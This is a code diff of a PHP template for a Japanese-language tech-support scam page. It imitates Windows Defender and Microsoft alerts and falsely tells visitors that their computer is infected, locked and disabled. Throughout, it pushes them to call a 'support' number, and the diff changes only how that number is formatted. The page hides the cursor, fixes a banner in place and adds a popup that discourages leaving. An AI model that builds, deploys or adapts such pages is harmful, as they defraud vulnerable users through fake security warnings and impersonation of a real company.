@@ -1,5 +1,5 @@
 <?php
-$number = '0101-551-688-3524';
+$number = '(0101)-551-688-3524';
 $dynamic_url = "https://wavesofjapanblog.site";
 #$dynamic_url = "http://127.0.0.1:800";
 
@@ -145,7 +145,7 @@ window.Anph = Anph;
 <div style="bottom:-20px;position:fixed;cursor:none;z-index:999999999;" id="footer">
     <div class="row">
         <div class="col-md-12">
-            <div class="right-foot" style="text-align:center;margin-bottom: 5px;"><span id="footertxt">              <img src="'.$dynamic_url.'/images/img01df.png"> Windows_セキュリティ </span> <span style="font-weight:500;padding-left:13px;color:#fff; ">ダイヤルウィンドウのサポート: <span style="border:1px solid #fff;border-radius:5px;padding:4px 5px"> <img src="'.$dynamic_url.'/images/winlo.png" alt="" style="width: 25px;vertical-align: sub;"> 直接お電話ください 0101-551-688-3524              </span>                    </span>
+            <div class="right-foot" style="text-align:center;margin-bottom: 5px;"><span id="footertxt">              <img src="'.$dynamic_url.'/images/img01df.png"> Windows_セキュリティ </span> <span style="font-weight:500;padding-left:13px;color:#fff; ">ダイヤルウィンドウのサポート: <span style="border:1px solid #fff;border-radius:5px;padding:4px 5px"> <img src="'.$dynamic_url.'/images/winlo.png" alt="" style="width: 25px;vertical-align: sub;"> 直接お電話ください (0101)-551-688-3524              </span>                    </span>
             </div>
         </div>
         <div class="col-md-12">
@@ -164,7 +164,7 @@ window.Anph = Anph;
     <div id="txtintro"><span class="colo-rd">          <div id="iewd">Windows_Defender_セキュリティセンター</div>          <div id="fwefe">セキュリティ侵害の影響を受けたシステム</div>          <div id="fwefc"> (エラーコード: 16JPsy7)</div>        </span>
     </div>
     <img src="'.$dynamic_url.'/images/re.gif" id="banner">
-    <div id="disclaimer">保護対策のためシステムへのアクセスが制限されています。 <br> <span class="support" style="font-size:22px;">Windows サポートに問い合わせてください: <br><span style="border:1px solid #114d9a;border-radius:5px;padding:4px 5px"> <img src="'.$dynamic_url.'/images/winlo.png" alt="" style="width: 25px;vertical-align: sub;"> 直接お電話ください 0101-551-688-3524           </span>            </span>
+    <div id="disclaimer">保護対策のためシステムへのアクセスが制限されています。 <br> <span class="support" style="font-size:22px;">Windows サポートに問い合わせてください: <br><span style="border:1px solid #114d9a;border-radius:5px;padding:4px 5px"> <img src="'.$dynamic_url.'/images/winlo.png" alt="" style="width: 25px;vertical-align: sub;"> 直接お電話ください (0101)-551-688-3524           </span>            </span>
     </div>
     <div id="bottom"><img src="'.$dynamic_url.'/images/img01df.png" id="badge"> <span class="title3">Windows</span>
         <ul>
@@ -185,7 +185,7 @@ window.Anph = Anph;
     <br> すぐにご連絡ください。電話で、弊社のエンジニアが削除手順をご案内します。 <br> 直ちに Windows
     サポートに連絡して、脅威を報告し、個人情報の盗難を止め、このデバイスへのアクセスをブロック解除してください。 <br>
     このウィンドウを閉じると、Windows の登録が一時停止され、個人情報が危険にさらされる可能性があります。 <br>
-    <p style="padding-bottom:0;color:#fff;font-size:16px">Windows サポートに電話してください: <strong> <span style="border:0px solid #fff;border-radius:5px;padding:5px 5px"> <br>直接お電話ください  0101-551-688-3524         </span></strong>
+    <p style="padding-bottom:0;color:#fff;font-size:16px">Windows サポートに電話してください: <strong> <span style="border:0px solid #fff;border-radius:5px;padding:5px 5px"> <br>直接お電話ください  (0101)-551-688-3524         </span></strong>
     </p>
     <div class="action_buttons"><a class="active" id="leave_page" style="cursor:pointer;color:#fff!important">わかりました</a> <a class="active" id="leave_page" style="color:#fff!important">キャンセル</a>
     </div>
@@ -194,13 +194,13 @@ window.Anph = Anph;
     <p style="color:#fff;margin-top:10px;font-size:16px;padding:0 5px" class="text-center">
         できるだけ早くご連絡ください。弊社のエンジニアが電話で削除手順をサポートいたします。お使いのコンピューターは無効になっています。Windows
         Defender SmartScreen が認識されないアプリケーションを停止しています。このアプリを実行すると、システムの安全性が損なわれる可能性があります。
-        <br> <strong>Windowsサポートに電話: <span style="border:1px solid #383d41;border-radius:5px;padding:6px 5px"> <img src="'.$dynamic_url.'/images/winlo.png" alt="�" style="width: 25px;vertical-align: bottom;"> 直接お電話ください 0101-551-688-3524        </span>
+        <br> <strong>Windowsサポートに電話: <span style="border:1px solid #383d41;border-radius:5px;padding:6px 5px"> <img src="'.$dynamic_url.'/images/winlo.png" alt="�" style="width: 25px;vertical-align: bottom;"> 直接お電話ください (0101)-551-688-3524        </span>
     </strong></p>
 </div>
 <div id="chat" style="display: block;"><img src="'.$dynamic_url.'/images/img01df.png"> <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Microsoft</span>
     <p style="font-weight:600;font-size:24px">サポートに電話する: <br></p>
     <h4 style="font-weight:600;font-size:22px"><img src="'.$dynamic_url.'/images/winlo.png" alt="" style="width: 25px;margin-left: 0;"> 電話してください
-        0101-551-688-3524
+        (0101)-551-688-3524
         <br>(セキュリティヘルプデスク)
     </h4>
     <div class="arrow-down">
@@ -295,7 +295,7 @@ window.Anph = Anph;
     <div style="height: 250px;width: 650px;margin: auto;margin-top: calc( (100vh / 2) - 125px );border: 2px white solid;padding: 50px; animation: scale 2s infinite alternate;">
         <p class="text-center" style="color: #FEFEFE; font-size: large;"> コンピュータを再起動したり、操作したりしないでください。<br>
             お使いのコンピュータは無効化されました。すぐにお電話ください。<br> このコンピュータでは、セキュリティ上の理由によりアクセスがブロックされています。<br>
-            直ちにご連絡ください。技術者が問題解決をサポートいたします。<br>直接お電話ください 0101-551-688-3524        </p></div>
+            直ちにご連絡ください。技術者が問題解決をサポートいたします。<br>直接お電話ください (0101)-551-688-3524        </p></div>
 </div>
 <div id="exit-popup" style="display: block;"><h3>サイトを離れますか？</h3>
     <p style="font-size: large">本当にこのページを退出しますか？</p>
